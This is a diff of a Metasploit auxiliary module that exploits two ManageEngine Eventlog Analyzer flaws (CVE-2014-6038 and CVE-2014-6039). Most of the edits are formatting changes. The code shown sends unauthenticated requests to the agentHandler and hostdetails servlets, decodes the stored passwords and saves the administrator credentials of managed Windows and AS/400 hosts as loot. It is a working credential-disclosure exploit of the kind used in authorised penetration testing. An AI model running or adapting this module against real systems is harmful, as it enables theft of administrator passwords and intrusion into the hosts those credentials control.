@@ -10,39 +10,46 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => 'ManageEngine Eventlog Analyzer Managed Hosts Administrator Credential Disclosure',
-      'Description' => %q{
-        ManageEngine Eventlog Analyzer from v7 to v9.9 b9002 has two security vulnerabilities that
-        allow an unauthenticated user to obtain the superuser password of any managed Windows and
-        AS/400 hosts. This module abuses both vulnerabilities to collect all the available
-        usernames and passwords. First the agentHandler servlet is abused to get the hostid and
-        slid of each device (CVE-2014-6038); then these numeric IDs are used to extract usernames
-        and passwords by abusing the hostdetails servlet (CVE-2014-6039). Note that on version 7,
-        the TARGETURI has to be prepended with /event.
-      },
-      'Author' =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'ManageEngine Eventlog Analyzer Managed Hosts Administrator Credential Disclosure',
+        'Description' => %q{
+          ManageEngine Eventlog Analyzer from v7 to v9.9 b9002 has two security vulnerabilities that
+          allow an unauthenticated user to obtain the superuser password of any managed Windows and
+          AS/400 hosts. This module abuses both vulnerabilities to collect all the available
+          usernames and passwords. First the agentHandler servlet is abused to get the hostid and
+          slid of each device (CVE-2014-6038); then these numeric IDs are used to extract usernames
+          and passwords by abusing the hostdetails servlet (CVE-2014-6039). Note that on version 7,
+          the TARGETURI has to be prepended with /event.
+        },
+        'Author' => [
           'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
         ],
-      'License' => MSF_LICENSE,
-      'References' =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2014-6038' ],
           [ 'CVE', '2014-6039' ],
           [ 'OSVDB', '114342' ],
           [ 'OSVDB', '114344' ],
           [ 'URL', 'https://seclists.org/fulldisclosure/2014/Nov/12' ]
         ],
-      'DisclosureDate' => '2014-11-05'))
+        'DisclosureDate' => '2014-11-05',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(8400),
-        OptString.new('TARGETURI', [ true,  'Eventlog Analyzer application URI (should be /event for version 7)', '/']),
-      ])
+        OptString.new('TARGETURI', [ true, 'Eventlog Analyzer application URI (should be /event for version 7)', '/']),
+      ]
+    )
   end
-
 
   def decode_password(encoded_password)
     password_xor = Rex::Text.decode_base64(encoded_password)
@@ -53,11 +60,10 @@ class MetasploitModule < Msf::Auxiliary
     return password
   end
 
-
   def run
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'agentHandler'),
-      'method' =>'GET',
+      'method' => 'GET',
       'vars_get' => {
         'mode' => 'getTableData',
         'table' => 'HostDetails'
@@ -72,7 +78,7 @@ class MetasploitModule < Msf::Auxiliary
     # When passwords have digits the XML parsing will fail.
     # Replace with an empty password attribute so that we know the device has a password
     # and therefore we want to add it to our host list.
-    xml = res.body.to_s.gsub(/&#[0-9]*;/,Rex::Text.rand_text_alpha(6))
+    xml = res.body.to_s.gsub(/&#[0-9]*;/, Rex::Text.rand_text_alpha(6))
     begin
       doc = REXML::Document.new(xml)
     rescue
@@ -89,8 +95,8 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     cred_table = Rex::Text::Table.new(
-      'Header'  => 'ManageEngine EventLog Analyzer Managed Devices Credentials',
-      'Indent'  => 1,
+      'Header' => 'ManageEngine EventLog Analyzer Managed Devices Credentials',
+      'Indent' => 1,
       'Columns' =>
         [
           'Host',
@@ -105,7 +111,7 @@ class MetasploitModule < Msf::Auxiliary
     slid_host_ary.each do |host|
       res = send_request_cgi({
         'uri' => normalize_uri(target_uri.path, 'hostdetails'),
-        'method' =>'GET',
+        'method' => 'GET',
         'vars_get' => {
           'slid' => host[0],
           'hostid' => host[1]
@@ -160,9 +166,9 @@ class MetasploitModule < Msf::Auxiliary
           end
 
           credential_core = report_credential_core({
-             password: password,
-             username: username,
-           })
+            password: password,
+            username: username,
+          })
 
           host_login_data = {
             address: host_ipaddress,
@@ -180,22 +186,22 @@ class MetasploitModule < Msf::Auxiliary
 
     print_line
     print_line("#{cred_table}")
-    loot_name     = 'manageengine.eventlog.managed_hosts.creds'
-    loot_type     = 'text/csv'
+    loot_name = 'manageengine.eventlog.managed_hosts.creds'
+    loot_type = 'text/csv'
     loot_filename = 'manageengine_eventlog_managed_hosts_creds.csv'
-    loot_desc     = 'ManageEngine Eventlog Analyzer Managed Hosts Administrator Credentials'
+    loot_desc = 'ManageEngine Eventlog Analyzer Managed Hosts Administrator Credentials'
     p = store_loot(
       loot_name,
       loot_type,
       rhost,
       cred_table.to_csv,
       loot_filename,
-      loot_desc)
+      loot_desc
+    )
     print_status "Credentials saved in: #{p}"
   end
 
-
-  def report_credential_core(cred_opts={})
+  def report_credential_core(cred_opts = {})
     # Set up the has for our Origin service
     origin_service_data = {
       address: rhost,
